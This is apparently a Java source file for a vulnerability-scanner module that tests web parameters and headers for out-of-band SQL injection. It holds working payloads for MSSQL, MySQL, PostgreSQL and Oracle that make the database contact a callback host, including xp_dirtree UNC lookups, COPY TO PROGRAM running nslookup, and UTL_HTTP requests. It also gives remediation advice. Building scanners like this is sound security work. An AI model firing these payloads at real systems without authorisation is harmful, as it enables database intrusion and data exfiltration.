package com.burpmax.active;

import java.util.*;
import static com.burpmax.model.Finding.*;

/**
 * OOB SQL injection probe — DNS exfiltration channel.
 *
 * Complements SqliProbe (error-based, time-based, boolean-based) by adding a
 * fourth strategy: DNS-based out-of-band exfiltration. This is valuable because:
 *
 *   - Faster than sleep-based: no need to wait 5-6 seconds per payload
 *   - More reliable than timing: immune to network jitter and server load variance
 *   - Works through WAFs that block error output but allow outbound DNS
 *   - Catches SQLi in stored procedures and background jobs that suppress output
 *
 * Database-specific OOB payloads:
 *
 *   MSSQL (xp_dirtree / xp_fileexist):
 *     '; EXEC master..xp_dirtree '\\HOST\a'--
 *     '; EXEC master..xp_fileexist '\\HOST\a'--
 *     Triggers a UNC path lookup → DNS resolution of HOST.
 *     Requires xp_dirtree to be enabled (default in many MSSQL installs).
 *
 *   MySQL (load_file on Windows):
 *     ' AND LOAD_FILE('\\\\HOST\\a')--
 *     Only works on Windows MySQL installs with FILE privilege + UNC paths allowed.
 *     Also tries INTO OUTFILE to a UNC path.
 *
 *   PostgreSQL (COPY TO PROGRAM / dblink):
 *     '; COPY (SELECT '') TO PROGRAM 'nslookup HOST'--
 *     '; SELECT dblink_connect('host=HOST')--
 *     COPY TO PROGRAM requires superuser. dblink requires extension.
 *
 *   Oracle (UTL_HTTP / UTL_INADDR):
 *     ' UNION SELECT UTL_HTTP.REQUEST('http://HOST/') FROM dual--
 *     ' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('HOST') FROM dual--
 *     Requires EXECUTE privilege on UTL_HTTP/UTL_INADDR (common default).
 *
 *   SQLite:
 *     No built-in OOB mechanism; excluded from this probe.
 *
 * Each payload uses a unique OOB host per injection point so callbacks
 * can be matched back to the exact parameter and database type.
 */
public class OobSqliProbe {

    // Each entry: [payload template, DB label]
    // HOST is replaced at runtime
    private static final List<String[]> OOB_PAYLOADS = List.of(

        // MSSQL — UNC path via xp_dirtree (most reliable, works on default installs)
        new String[]{"'; EXEC master..xp_dirtree '\\\\HOST\\a'--",          "MSSQL-xp_dirtree"},
        new String[]{"1; EXEC master..xp_dirtree '\\\\HOST\\a'--",          "MSSQL-xp_dirtree-num"},
        new String[]{"'; EXEC master..xp_fileexist '\\\\HOST\\a'--",        "MSSQL-xp_fileexist"},

        // MySQL — LOAD_FILE UNC (Windows only, requires FILE privilege)
        new String[]{"' AND LOAD_FILE('\\\\\\\\HOST\\\\a')-- -",            "MySQL-load_file"},
        new String[]{"' UNION SELECT LOAD_FILE('\\\\\\\\HOST\\\\a')-- -",   "MySQL-load_file-union"},

        // PostgreSQL — COPY TO PROGRAM (requires superuser)
        new String[]{"'; COPY (SELECT '') TO PROGRAM 'nslookup HOST'--",    "PostgreSQL-copy_program"},
        new String[]{"'; SELECT dblink_connect('host=HOST dbname=x')--",    "PostgreSQL-dblink"},

        // Oracle — UTL_HTTP / UTL_INADDR
        new String[]{"' UNION SELECT UTL_HTTP.REQUEST('http://HOST/') FROM dual--",
                     "Oracle-utl_http"},
        new String[]{"' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('HOST') FROM dual--",
                     "Oracle-utl_inaddr"},
        new String[]{"' AND 1=UTL_INADDR.GET_HOST_ADDRESS('HOST') AND '1'='1",
                     "Oracle-utl_inaddr-and"}
    );

    private static final List<String> INJECTABLE_HEADERS = List.of(
        "User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP", "Client-IP"
    );

    // ── Main entry point ──────────────────────────────────────────────────────
    public static List<ActiveScanResult> probe(ProbeContext ctx,
                                               RequestBuilder rb,
                                               HttpSender sender,
                                               OobClient oob) {
        if (oob == null || !oob.isAvailable()) return List.of();

        List<ActiveScanResult> results = new ArrayList<>();

        // ── Parameters ────────────────────────────────────────────────────
        for (String param : ctx.allParamNames()) {
            injectOob(ctx, rb, sender, oob, param, null);
        }

        // ── Headers ───────────────────────────────────────────────────────
        for (String header : INJECTABLE_HEADERS) {
            injectOob(ctx, rb, sender, oob, null, header);
        }

        return results;
    }

    private static void injectOob(ProbeContext ctx, RequestBuilder rb, HttpSender sender,
                                   OobClient oob, String param, String header) {
        String injectTarget = param != null ? param : header;
        for (String[] entry : OOB_PAYLOADS) {
            String oobHost = oob.generateHost("sqli-" + entry[1] + "-" + injectTarget);
            if (oobHost == null) continue;

            String payload = entry[0].replace("HOST", oobHost);
            byte[] req = param != null
                    ? rb.buildProbeRequest(ctx, param, payload)
                    : rb.injectHeader(ctx.originalRequest, header, payload);
            if (req == null) continue;

            // Record before sending — ensures any OOB callback can be matched even if
            // the HTTP response is null (connection error, cancellation, or WAF drop).
            oob.recordInjection(oobHost,
                    "SQL Injection (OOB DNS) [" + entry[1] + "]",
                    ctx.url, injectTarget, payload, req);
            sender.send(ctx.service, req);  // fire-and-forget
        }
    }

    // ── Finding builder ───────────────────────────────────────────────────────
    public static ActiveScanResult buildFinding(OobClient.OobHit hit) {
        String dbLabel = "unknown";
        int lb = hit.probeName().lastIndexOf('[');
        int rb2 = hit.probeName().lastIndexOf(']');
        if (lb >= 0 && rb2 > lb) dbLabel = hit.probeName().substring(lb + 1, rb2);

        String db = dbLabel.split("-")[0];  // "MSSQL", "MySQL", "PostgreSQL", "Oracle"

        return new ActiveScanResult(
            "SQL Injection (Out-of-Band DNS Exfiltration)", SEV_CRITICAL,
            "Out-of-band SQL injection was confirmed via a DNS callback from a " + db +
            " database server. The payload injected into '" + hit.parameter() +
            "' caused the database to resolve the OOB hostname (" + hit.interactionDetail() +
            ") confirming unsanitised input reaches a SQL query and the database has " +
            "outbound network access. This is a stronger confirmation than time-based " +
            "or boolean-based blind injection - a DNS hit is a protocol-level fact. " +
            "An attacker can exfiltrate data character-by-character via DNS subdomains " +
            "(e.g. '" + db.toLowerCase() + "' OOB data exfiltration techniques).",
            "OOB callback: " + hit.interactionDetail() +
            " | DB: " + db +
            " | Payload variant: " + dbLabel +
            " | Parameter: " + hit.parameter() +
            " | Payload: " + trunc(hit.payload(), 100),
            "PRIMARY FIX - Parameterised Queries (same as in-band SQLi):\n" +
            "Use prepared statements in every database call. OOB SQLi confirms the same\n" +
            "root cause as error-based SQLi - unsanitised input in SQL queries.\n\n" +
            "DATABASE-SPECIFIC HARDENING:\n" +
            "- MSSQL: disable xp_dirtree, xp_fileexist, xp_cmdshell:\n" +
            "    EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;\n" +
            "- MySQL: deny FILE privilege; disable UNC path resolution on Windows.\n" +
            "- PostgreSQL: revoke SUPERUSER; deny pg_read_file, COPY TO PROGRAM.\n" +
            "- Oracle: revoke EXECUTE on UTL_HTTP, UTL_FILE, UTL_INADDR from app user.\n\n" +
            "EGRESS FILTERING:\n" +
            "- Block all outbound DNS/HTTP/LDAP from the database server host. A database\n" +
            "  server should never initiate outbound network connections in production.\n" +
            "- Enable query logging and alert on any execution of xp_dirtree, UTL_HTTP,\n" +
            "  or COPY TO PROGRAM.",
            "CWE-89",
            hit.endpoint(), hit.parameter(), hit.payload(), "", hit.interactionDetail());
    }

    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }
}
